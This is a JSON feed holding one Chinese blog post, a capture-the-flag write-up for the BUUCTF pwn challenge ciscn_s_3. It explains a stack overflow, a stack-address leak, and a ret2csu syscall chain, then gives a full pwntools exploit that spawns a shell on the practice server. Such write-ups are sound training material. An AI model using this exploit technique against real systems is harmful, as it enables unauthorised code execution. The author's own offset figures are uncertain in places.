{
    "version": "https://jsonfeed.org/version/1",
    "title": "Blog • All posts by \"buuctf\" category",
    "description": "",
    "home_page_url": "https://vvwwvv.cn",
    "items": [
        {
            "id": "https://vvwwvv.cn/2023/05/04/pwn/%E5%88%B7%E9%A2%98/BUUCTF/ciscn_s_3/",
            "url": "https://vvwwvv.cn/2023/05/04/pwn/%E5%88%B7%E9%A2%98/BUUCTF/ciscn_s_3/",
            "title": "ciscn_s_3（利用系统调用+ret2csu）",
            "date_published": "2023-05-04T11:33:55.000Z",
            "content_html": "<h1 id=\"ciscn_s_3\"><a class=\"anchor\" href=\"#ciscn_s_3\">#</a> ciscn_s_3</h1>\n<h3 id=\"1下载附件后查看程序信息\"><a class=\"anchor\" href=\"#1下载附件后查看程序信息\">#</a> 1. 下载附件后查看程序信息</h3>\n<p><img data-src=\"https://s1.ax1x.com/2023/09/09/pP6sKKK.png\" alt=\"\" /></p>\n<p>可以看到是 64 位程序，并且开启了 NX</p>\n<h3 id=\"2利用ida反汇编\"><a class=\"anchor\" href=\"#2利用ida反汇编\">#</a> 2. 利用 ida 反汇编</h3>\n<p><img data-src=\"https://s1.ax1x.com/2023/09/09/pP6s85d.md.png\" alt=\"\" /></p>\n<p>发现有个 vul 函数，进入查看</p>\n<p><img data-src=\"https://s1.ax1x.com/2023/09/09/pP6sJPA.png\" alt=\"\" /></p>\n<p>发现是 sys_read 函数，并且可以通过 <strong>sys_read 溢出</strong>，查看汇编代码</p>\n<p><img data-src=\"https://s1.ax1x.com/2023/09/09/pP6sY8I.png\" alt=\"\" /></p>\n<p>发现有 syscall，由此判断是系统调用，那么我们通过 <strong>控制寄存器</strong> 的方式来进行系统调用然后 getshell</p>\n<h3 id=\"3漏洞利用分析\"><a class=\"anchor\" href=\"#3漏洞利用分析\">#</a> 3. 漏洞利用分析</h3>\n<p>此处放上之前的文章：<a href=\"https://vvwwvv.cn/2023/08/29/Linux/%E7%B3%BB%E7%BB%9F%E8%B0%83%E7%94%A8/\" title=\"Linux之系统调用\">https://vvwwvv.cn/2023/08/29/Linux/%E7%B3%BB%E7%BB%9F%E8%B0%83%E7%94%A8/</a></p>\n<p>上面链接里能看到 64 位系统的系统调用号，找到 execve 命令是 59（0x3b）</p>\n<pre><code class=\"language-C\">\nint execve(const char *filename, char *const argv[], char *const envp[]);\n\n//const char *filename 为要执行文件的地址\n\n//char *const argv[]：传递给程序的完整参数列表，包括argv[0]，它一般是程序的名\n\n//char *const envp[]：一般传递NULL，表示可变参数的结尾。\n\n</code></pre>\n<p>我们要执行的是  <code>execve(&quot;/bin/sh&quot;,0,0)</code>  来 getshell</p>\n<h3 id=\"4控制寄存器\"><a class=\"anchor\" href=\"#4控制寄存器\">#</a> 4. 控制寄存器</h3>\n<p>将 0x3b 存入 rax 寄存器，64 位系统调用寄存器顺序依次为：rdi，rsi，rdx</p>\n<p>本想着通过 Ropgadgets 查找对应寄存器构造 rop 链</p>\n<p><img data-src=\"https://s1.ax1x.com/2023/09/09/pP6sHR1.png\" alt=\"\" /></p>\n<p>但是发现无法控制 rax 寄存器与 rdx 寄存器，所以要使用其他方法</p>\n<p>查看汇编发现有个 gadgets 函数，但是不知道为什么在代码流程图里没有显示后面的部分</p>\n<p><img data-src=\"https://s1.ax1x.com/2023/09/09/pP6sxde.png\" alt=\"\" /></p>\n<p>此处看到 0x3b 存入了 rax，正好是 execve 的系统调用号 (也可以在 ida 窗口中按 alt+t 查找 mov rax,3bh 指令，找到指令存储位置为 0x4004E2)</p>\n<p>接着需要控制相应的传参寄存器，rdi，rsi，rdx，rcx, r8, r9。因为可以溢出的字符很多，那么我们可以利用   <strong>csu_init（ret2csu）</strong>  这一段代码，因为 64 位程序需要该函数对 libc 进行初始化，一般的程序都会调用 libc 函数，所以 <strong>一定存在</strong> 这个函数，并且该函数先于 main 函数执行</p>\n<p>原理:<a href=\"https://vvwwvv.cn/2023/08/24/pwn/ROP/ret2csu\" title=\"64位构造通用ROP\">https://vvwwvv.cn/2023/08/24/pwn/ROP/ret2csu</a></p>\n<h4 id=\"5构造rop\"><a class=\"anchor\" href=\"#5构造rop\">#</a> 5. 构造 rop</h4>\n<p>通过 ida 可以找到 csu 段地址，下面为 gadgets1</p>\n<p><img data-src=\"https://s1.ax1x.com/2023/09/09/pPcCbss.png\" alt=\"\" /></p>\n<p>当我们进入 gadgets1 时，执行了 add rsp ,8 所以要填充 8 个字符，后续的 rbx 要为 0 才能不跳转，rbp 为 1 使其与后续加 1 后的 rbx 相同，r12 不需要所以可以任意，r13，r14，r15 分别会在 gadgets2 控制 rdx，rsi，rdi，填入我们需要的值，具体值如下：</p>\n<ul>\n<li>rbx=0</li>\n<li>rbp=1</li>\n<li>r12=0</li>\n<li>r13=0  （对应 rdx=0）</li>\n<li>r14=0  （对应 rsi=0）</li>\n<li>r15=&quot;binsh&quot; 的地址  （对应 rdi=&quot;/bin/sh&quot;）</li>\n</ul>\n<p>此处执行的是  <code>execve(&quot;/bin/sh&quot;,0,0)  </code>  execve( rdi , rsi , rdx )</p>\n<p>由此我们需要找到 &quot;/bin/sh&quot; 地址，由于程序内找不到 &quot;/bin/sh&quot; , 所以需要我们自己写入 &quot;/bin/sh&quot;</p>\n<p><img data-src=\"https://s1.ax1x.com/2023/09/09/pPcCjoV.png\" alt=\"\" /></p>\n<p>由上面的图可以看到，sys_wrtie 会输出 0x30 个字符，而 buf 在栈上只有 0x10 的大小，后面紧接着的 0x10 为 ret 和初始的 rbp 所占空间，后面 8 个字符为栈上的某一地址， <strong>利用该地址减去与 &quot;/bin/sh&quot; 地址的偏移量</strong> 即可获得 &quot;/bin/sh&quot; 地址。（这里是因为开启了保护每次在栈上的地址不同，而偏移是不会变的）</p>\n<p><strong>查看方式 1</strong></p>\n<p><img data-src=\"https://s1.ax1x.com/2023/09/09/pPcii9S.png\" alt=\"\" /></p>\n<p>由上面的图片可以看出输入的字符串的地址（这里因为溢出所以应该为 ddf0），而看到距离 rsp 为 0x20 的地方输出了我们调试的程序的名称，这个一般是保存在 avrg [0]，这个是栈上的地址</p>\n<p><strong>查看方式 2</strong></p>\n<p><img data-src=\"https://s1.ax1x.com/2023/09/09/pPcFrGT.png\" alt=\"\" /></p>\n<p>首先为写入的 buf 地址，然后在 0x20 大小后为栈地址，原因入下图，因此通过 sys_write 即可泄露</p>\n<p><img data-src=\"https://s1.ax1x.com/2023/09/09/pPcAxxS.png\" alt=\"\" /></p>\n<p>由于开启了保护所以写入栈的位置是不固定的，但是可以通过当此运行时泄露的栈地址减去固定的偏移量即可得到写入的字符串地址</p>\n<h3 id=\"7字符串地址计算方法\"><a class=\"anchor\" href=\"#7字符串地址计算方法\">#</a> 7. 字符串地址计算方法:</h3>\n<p>通过上面的 0x7fffffffdf38-0x7fffffffddf0=0x148 , 在计算栈的偏移时是 0x148（不知道是不是因为计算错误），但是线上靶场的环境栈的偏移是 0x118。</p>\n<p>在本地可以利用 patchelf 切换 libc 版本</p>\n<pre><code>patchelf --set-interpreter ~/Tools/glibc-all-in-one/libs/2.23-0ubuntu3_amd64/ld-2.23.so --set-rpath ~/Tools/glibc-all-in-one/libs/2.23-0ubuntu3_amd64/ ./ciscn_s_3\n</code></pre>\n<p>有了偏移之后就可以通过偏移量来计算输入的字符串地址：</p>\n<p><strong>输入字符串地址 = 泄露的栈地址 - 0x118</strong></p>\n<p>至此就得到了 &quot;/bin/sh&quot; 地址</p>\n<h3 id=\"8构造exp\"><a class=\"anchor\" href=\"#8构造exp\">#</a> 8. 构造 exp</h3>\n<p>因为 &quot;/bin/sh&quot; 占 7 个字节，需要改成 &quot;/bin/sh\\x00&quot; 来用隔断符来满足 8 个字节进行对齐</p>\n<p>先执行 syscall 还是先到 gadgets:</p>\n<p>先 gadgets 最后返回到 syscall</p>\n<p>系统调用号与 syscall 之间的执行顺序：</p>\n<p>系统调用号执行后返回到 syscall，参数都在前面</p>\n<p>exp：</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">from</span> pwn <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">from</span> LibcSearcher <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>context<span class=\"token punctuation\">.</span>log_level <span class=\"token operator\">=</span> <span class=\"token string\">'debug'</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>p<span class=\"token operator\">=</span>remote<span class=\"token punctuation\">(</span><span class=\"token string\">'node4.buuoj.cn'</span><span class=\"token punctuation\">,</span><span class=\"token number\">26711</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>e<span class=\"token operator\">=</span>ELF<span class=\"token punctuation\">(</span><span class=\"token string\">\"./ciscn_s_3\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>main<span class=\"token operator\">=</span><span class=\"token number\">0x04004ED</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>execve<span class=\"token operator\">=</span><span class=\"token number\">0x0004004E2</span> <span class=\"token comment\">#mov rax,3BH; ret;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>syscall<span class=\"token operator\">=</span><span class=\"token number\">0x000400501</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>gadgets1<span class=\"token operator\">=</span><span class=\"token number\">0x000040059a</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>gadgets2<span class=\"token operator\">=</span><span class=\"token number\">0x0000400580</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>rdi_ret<span class=\"token operator\">=</span><span class=\"token number\">0x004005a3</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre></pre></td></tr><tr><td data-num=\"15\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">csu</span><span class=\"token punctuation\">(</span>rbx<span class=\"token punctuation\">,</span>rbp<span class=\"token punctuation\">,</span>r12<span class=\"token punctuation\">,</span>r13<span class=\"token punctuation\">,</span>r14<span class=\"token punctuation\">,</span>r15<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>    payload<span class=\"token operator\">=</span><span class=\"token string\">b\"/bin/sh\\x00\"</span><span class=\"token operator\">+</span><span class=\"token string\">b\"a\"</span><span class=\"token operator\">*</span><span class=\"token number\">8</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span>gadgets1<span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span>rbx<span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span>rbp<span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span>r12<span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span>r13<span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span>r14<span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span>r15<span class=\"token punctuation\">)</span> <span class=\"token comment\">#此处 r15 的值可有可无，因为后面仍然调用 rdi_ret 来传参</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>    payload<span class=\"token operator\">+=</span>p64<span class=\"token punctuation\">(</span>gadgets2<span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span>rdi_ret<span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span>binsh<span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span>execve<span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span>syscall<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>    p<span class=\"token punctuation\">.</span>send<span class=\"token punctuation\">(</span>payload<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>    </pre></td></tr><tr><td data-num=\"20\"></td><td><pre>payload1<span class=\"token operator\">=</span><span class=\"token string\">b\"/bin/sh\\x00\"</span><span class=\"token operator\">+</span><span class=\"token string\">b\"a\"</span><span class=\"token operator\">*</span><span class=\"token number\">8</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span>main<span class=\"token punctuation\">)</span>  <span class=\"token comment\"># 此处之间填充到 ret，没有考虑 rbp，gdb 中调试就可以发现</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>p<span class=\"token punctuation\">.</span>send<span class=\"token punctuation\">(</span>payload1<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>p<span class=\"token punctuation\">.</span>recv<span class=\"token punctuation\">(</span><span class=\"token number\">0x20</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>binsh<span class=\"token operator\">=</span>u64<span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">.</span>recv<span class=\"token punctuation\">(</span><span class=\"token number\">8</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token operator\">-</span><span class=\"token number\">0x118</span> <span class=\"token comment\">#减去偏移获得 \"/bin/sh\" 地址</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>csu<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span>binsh<span class=\"token operator\">+</span><span class=\"token number\">0x50</span><span class=\"token punctuation\">,</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span>binsh<span class=\"token punctuation\">)</span>  <span class=\"token comment\"># 这里的 binsh+0x50 是传入字符串 \"/bin/sh\" 后开始，到 p64（execve）</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre><span class=\"token comment\">#p.recv()</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>p<span class=\"token punctuation\">.</span>interactive<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><p>借用别人的一张图理解 binsh+0x50<br />\n<img data-src=\"https://img-blog.csdnimg.cn/20210423174224878.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3hpZXlpY2hlbnNzcw==,size_16,color_FFFFFF,t_70\" alt=\"\" /></p>\n<p>参考：</p>\n<p><span class=\"exturl\" data-url=\"aHR0cDovL3QuY3Nkbi5jbi9aTEZ4RA==\">http://t.csdn.cn/ZLFxD</span></p>\n<p><span class=\"exturl\" data-url=\"aHR0cDovL3QuY3Nkbi5jbi9TU1k5bw==\">http://t.csdn.cn/SSY9o</span></p>\n<p>注意：不知道是不是因为部分地方没写对，用之前的 csu 方法有点问题，总要 binsh+0x50 才可以</p>\n",
            "tags": [
                "pwn",
                "ret2csu",
                "ctf",
                "系统调用"
            ]
        }
    ]
}